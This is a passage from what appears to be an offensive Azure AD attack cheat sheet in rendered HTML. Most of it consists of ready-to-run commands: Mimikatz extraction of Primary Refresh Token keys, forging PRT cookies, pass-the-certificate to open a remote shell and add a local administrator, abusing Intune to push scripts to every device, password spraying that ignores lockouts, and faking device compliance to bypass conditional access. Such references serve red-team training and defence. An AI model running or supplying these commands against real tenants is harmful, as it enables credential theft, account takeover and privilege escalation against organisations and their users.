<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="n">dpapi</span><span class="p">::</span><span class="n">cloudapkd</span> <span class="p">/</span><span class="n">keyvalue</span><span class="p">:&lt;</span><span class="n">KeyValue</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">unprotect</span>
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="c"># Copy the Context, ClearKey and DerivedKey</span>
<a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="n">dpapi</span><span class="p">::</span><span class="n">cloudapkd</span> <span class="p">/</span><span class="n">context</span><span class="p">:&lt;</span><span class="n">Context</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">derivedkey</span><span class="p">:&lt;</span><span class="n">DerivedKey</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">Prt</span><span class="p">:&lt;</span><span class="n">PRT</span><span class="p">&gt;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c"># Generate a JWT</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$PRT_OF_USER</span> <span class="p">=</span> <span class="s1">&#39;...&#39;</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="k">while</span><span class="p">(</span><span class="nv">$PRT_OF_USER</span><span class="p">.</span><span class="n">Length</span> <span class="p">%</span> <span class="n">4</span><span class="p">)</span> <span class="p">{</span><span class="nv">$PRT_OF_USER</span> <span class="p">+=</span> <span class="s2">&quot;=&quot;</span><span class="p">}</span>
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$PRT</span> <span class="p">=</span> <span class="no">[text.encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$PRT_OF_USER</span><span class="p">))</span>
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$ClearKey</span> <span class="p">=</span> <span class="s2">&quot;XXYYZZ...&quot;</span>
<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$SKey</span> <span class="p">=</span> <span class="no">[convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span> <span class="no">[byte[]]</span> <span class="p">(</span><span class="nv">$ClearKey</span> <span class="o">-replace</span> <span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="s1">&#39;0x$&amp;,&#39;</span> <span class="n">-split</span> <span class="s1">&#39;,&#39;</span> <span class="o">-ne</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
<a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-RefreshToken</span> <span class="nv">$PRT</span> <span class="n">-SessionKey</span> <span class="nv">$SKey</span> <span class="err">–</span><span class="n">GetNonce</span>
<a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="n">eyJ0eXAiOiJKV1QiL</span><span class="p">...</span>
</code></pre></div>
<p>The <code>&lt;Signed JWT&gt;</code> (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.  <br />
Edit the Chrome cookie (F12) -&gt; Application -&gt; Cookies with the values:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="n">Name</span><span class="p">:</span> <span class="n">x-ms-RefreshTokenCredential</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="n">Value</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">Signed</span> <span class="n">JWT</span><span class="p">&gt;</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="n">HttpOnly</span><span class="p">:</span> <span class="err">√</span>
</code></pre></div>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Mark the cookie with the flags <code>HTTPOnly</code> and <code>Secure</code>.</p>
<h2 id="pass-the-certificate">Pass The Certificate</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="nb">Copy-Item</span> <span class="n">-ToSession</span> <span class="nv">$jumpvm</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">PrtToCertmaster</span><span class="p">.</span><span class="n">zip</span> <span class="n">-Destination</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">username</span> <span class="err">–</span><span class="n">Verbose</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="nb">Expand-Archive</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">PrtToCert-master</span><span class="p">.</span><span class="n">zip</span> <span class="n">-DestinationPath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">PrtToCert</span>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="c"># Require the PRT, TenantID, Context and DerivedKey</span>
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="p">&amp;</span> <span class="s1">&#39;C:\Program Files\Python39\python.exe&#39;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">PrtToCert</span><span class="p">\</span><span class="n">RequestCert</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-tenantId</span> <span class="p">&lt;</span><span class="n">TENANT-ID</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-prt</span> <span class="p">&lt;</span><span class="n">PRT</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-userName</span> <span class="p">&lt;</span><span class="n">Username</span><span class="p">&gt;@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-hexCtx</span> <span class="p">&lt;</span><span class="n">HEX-CONTEXT</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-hexDerivedKey</span> <span class="p">&lt;</span><span class="n">HEX-DERIVED-KEY</span><span class="p">&gt;</span>
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="c"># PFX saved with the name &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com.pfx and password AzureADCert</span>
</code></pre></div>
<p>Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine</p>
<p>https://github.com/morRubin/AzureADJoinedMachinePTC</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">Main</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">-</span><span class="n">-usercert</span> <span class="n">USERCERT</span> <span class="p">-</span><span class="n">-certpass</span> <span class="n">CERTPASS</span> <span class="p">-</span><span class="n">-remoteip</span> <span class="n">REMOTEIP</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">Main</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-usercert</span> <span class="s2">&quot;admin.pfx&quot;</span> <span class="p">-</span><span class="n">-certpass</span> <span class="n">password</span> <span class="p">-</span><span class="n">-remoteip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="n">python</span> <span class="n">Main</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-usercert</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">username</span><span class="p">\&lt;</span><span class="n">USERNAME</span><span class="p">&gt;@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span><span class="p">.</span><span class="n">pfx</span> <span class="p">--</span>
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="n">certpass</span> <span class="n">AzureADCert</span> <span class="p">-</span><span class="n">-remoteip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="p">-</span><span class="n">-command</span> <span class="s2">&quot;cmd.exe /c net user username Password@123 /add /Y &amp;&amp; net localgroup administrators username /add&quot;</span>
</code></pre></div>
<h2 id="intunes-administration">Intunes Administration</h2>
<p>Requirements:
* <strong>Global Administrator</strong> or <strong>Intune Administrator</strong> Privilege : <code>Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"</code></p>
<ol>
<li>Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT</li>
<li>Go to <strong>Devices</strong> -&gt; <strong>All Devices</strong> to check devices enrolled to Intune</li>
<li>Go to <strong>Scripts</strong> and click on <strong>Add</strong> for Windows 10. </li>
<li>Add a <strong>Powershell script</strong></li>
<li>Specify <strong>Add all users</strong> and <strong>Add all devices</strong> in the <strong>Assignments</strong> page.</li>
</ol>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> It will take up to one hour before you script is executed !</p>
<h2 id="dynamic-group-membership">Dynamic Group Membership</h2>
<p>Get groups that allow Dynamic membership: <code>Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}</code></p>
<p>Rule example : <code>(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")</code>  <br />
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group</p>
<ol>
<li>Open user's profile, click on <strong>Manage</strong></li>
<li>Click on <strong>Resend</strong> invite and to get an invitation URL</li>
<li>Set the secondary email
    <div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Set-AzureADUser</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">OBJECT-ID</span><span class="p">&gt;</span> <span class="n">-OtherMails</span> <span class="p">&lt;</span><span class="n">Username</span><span class="p">&gt;@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="n">-Verbose</span>
</code></pre></div></li>
</ol>
<h2 id="administrative-unit">Administrative Unit</h2>
<blockquote>
<p>Administrative Unit can reset password of another user</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADMSAdministrativeUnit</span> <span class="n">-Id</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADMSAdministrativeUnitMember</span> <span class="n">-Id</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADMSScopedRoleMembership</span> <span class="n">-Id</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADDirectoryRole</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">RoleId</span><span class="p">&gt;</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">RoleMemberInfo</span><span class="p">.</span><span class="n">Id</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">fl </span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$password</span> <span class="p">=</span> <span class="s2">&quot;Password&quot;</span> <span class="p">|</span> <span class="n">ConvertToSecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">Get-AzureADUser</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">UserPrincipalName</span> <span class="o">-eq</span> <span class="s2">&quot;&lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span><span class="p">}).</span><span class="n">ObjectId</span> <span class="p">|</span> <span class="n">SetAzureADUserPassword</span> <span class="n">-Password</span> <span class="nv">$Password</span> <span class="n">-Verbose</span>
</code></pre></div>
<h2 id="deployment-template">Deployment Template</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzResourceGroup</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzResourceGroupDeployment</span> <span class="n">-ResourceGroupName</span> <span class="n">SAP</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c"># Export</span>
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Save-AzResourceGroupDeploymentTemplate</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RESOURCE</span> <span class="n">GROUP</span><span class="p">&gt;</span> <span class="n">-DeploymentName</span> <span class="p">&lt;</span><span class="n">DEPLOYMENT</span> <span class="n">NAME</span><span class="p">&gt;</span>
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="nb">cat </span><span class="p">&lt;</span><span class="n">DEPLOYMENT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">json</span> <span class="c"># search for hardcoded password</span>
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="nb">cat </span><span class="p">&lt;</span><span class="n">PATH</span> <span class="n">TO</span> <span class="p">.</span><span class="n">json</span> <span class="n">FILE</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">password</span>
</code></pre></div>
<h2 id="application-proxy">Application Proxy</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c"># Enumerate application that have Proxy</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-AzureADApplication</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="p">|</span> <span class="p">%{</span><span class="k">try</span><span class="p">{</span><span class="n">GetAzureADApplicationProxyApplication</span> <span class="n">-ObjectId</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ObjectID</span><span class="p">;</span><span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span><span class="p">;</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectID</span><span class="p">}</span><span class="k">catch</span><span class="p">{}}</span>
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-AzureADServicePrincipal</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-eq</span> <span class="s2">&quot;Finance Management System&quot;</span><span class="p">}</span>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="p">.</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">GetApplicationProxyAssignedUsersAndGroups</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-ApplicationProxyAssignedUsersAndGroups</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">OBJECT-ID</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="application-endpoint">Application Endpoint</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c"># Enumerate possible endpoints for applications starting/ending with PREFIX</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-AzureADServicePrincipal</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="n">-Filter</span> <span class="s2">&quot;startswith(displayName,&#39;PREFIX&#39;)&quot;</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ReplyUrls</span><span class="p">}</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-AzureADApplication</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="n">-Filter</span> <span class="s2">&quot;endswith(displayName,&#39;PREFIX&#39;)&quot;</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">ReplyUrls</span><span class="p">,</span><span class="n">WwwHomePage</span><span class="p">,</span><span class="n">HomePage</span>
</code></pre></div>
<h2 id="conditional-access">Conditional Access</h2>
<ul>
<li>Bypassing conditional access by copying User-Agent (Chrome Dev Tool &gt; Select iPad Pro, etc)</li>
<li>Bypassing conditional access by faking device compliance
    <div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c"># AAD Internals - Making your device compliant</span>
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="c"># Get an access token for AAD join and save to cache</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>
<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c"># Join the device to Azure AD</span>
<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">&quot;SixByFour&quot;</span> <span class="n">-DeviceType</span> <span class="s2">&quot;Commodore&quot;</span> <span class="n">-OSVersion</span> <span class="s2">&quot;C64&quot;</span>
<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="c"># Marking device compliant - option 1: Registering device to Intune</span>
<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c"># Get an access token for Intune MDM and save to cache (prompts for credentials)</span>
<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="nb">Get-AADIntAccessTokenForIntuneMDM</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-SaveToCache</span> 
<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="c"># Join the device to Intune</span>
<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="nb">Join-AADIntDeviceToIntune</span> <span class="n">-DeviceName</span> <span class="s2">&quot;SixByFour&quot;</span>
<a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a><span class="c"># Start the call back</span>
<a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a><span class="nb">Start-AADIntDeviceIntuneCallback</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7-MDM</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-DeviceName</span> <span class="s2">&quot;SixByFour&quot;</span>
</code></pre></div></li>
</ul>
<h2 id="azure-ad">Azure AD</h2>
<p>With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.</p>
<ol>
<li>Authenticate to your webmail portal (i.e. https://webmail.domain.com/)</li>
<li>Change your browser URL to: https://azure.microsoft.com/</li>
<li>Pick the account from the active sessions</li>
<li>Select Azure Active Directory and enjoy!</li>
</ol>
<h3 id="azure-ad-vs-active-directory">Azure AD vs Active Directory</h3>
<table>
<thead>
<tr>
<th>Active Directory</th>
<th>Azure AD</th>
</tr>
</thead>
<tbody>
<tr>
<td>LDAP</td>
<td>REST API'S</td>
</tr>
<tr>
<td>NTLM/Kerberos</td>
<td>OAuth/SAML/OpenID</td>
</tr>
<tr>
<td>Structured directory (OU tree)</td>
<td>Flat structure</td>
</tr>
<tr>
<td>GPO</td>
<td>No GPO's</td>
</tr>
<tr>
<td>Super fine-tuned access controls</td>
<td>Predefined roles</td>
</tr>
<tr>
<td>Domain/forest</td>
<td>Tenant</td>
</tr>
<tr>
<td>Trusts</td>
<td>Guests</td>
</tr>
</tbody>
</table>
<ul>
<li>Password Hash Syncronization (PHS)<ul>
<li>Passwords from on-premise AD are sent to the cloud</li>
<li>Use replication via a service account created by AD Connect</li>
</ul>
</li>
<li>Pass Through Authentication (PTA)<ul>
<li>Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text</li>
</ul>
</li>
<li>
<p>Connect Windows Server AD to Azure AD using Federation Server (ADFS)</p>
<ul>
<li>Dir-Sync : Handled by on-premise Windows Server AD, sync username/password</li>
</ul>
</li>
<li>
<p>Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large</p>
</li>
<li>Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large</li>
<li>Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large</li>
<li>Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large</li>
</ul>
<h3 id="password-spray">Password Spray</h3>
<blockquote>
<p>Default lockout policy of 10 failed attempts, locking out an account for 60 seconds</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dafthack</span><span class="p">/</span><span class="n">MSOLSpray</span>
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="nb">Invoke-MSOLSpray</span> <span class="n">-UserList</span> <span class="p">.\</span><span class="n">userlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">Winter2020</span>
<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="nb">Invoke-MSOLSpray</span> <span class="n">-UserList</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="n">d0ntSprayme</span><span class="p">!</span>
<a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>
<a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="c"># UserList  - UserList file filled with usernames one-per-line in the format &quot;user@domain.com&quot;</span>
<a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c"># Password  - A single password that will be used to perform the password spray.</span>
<a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="c"># OutFile   - A file to output valid results to.</span>
<a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="c"># Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.</span>
<a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c"># URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.</span>
</code></pre></div>
<h3 id="convert-guid-to-sid">Convert GUID to SID</h3>
<p>The user's AAD id is translated to SID by concatenating <code>"S-1–12–1-"</code> to the decimal representation of each section of the AAD Id.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">GUID</span><span class="p">:</span> <span class="p">[</span><span class="n">base16</span><span class="p">(</span><span class="n">a1</span><span class="p">)]-[</span><span class="n">base16</span><span class="p">(</span><span class="n">a2</span><span class="p">)]-[</span> <span class="n">base16</span><span class="p">(</span><span class="n">a3</span><span class="p">)]-[</span><span class="n">base16</span><span class="p">(</span><span class="n">a4</span><span class="p">)]</span>
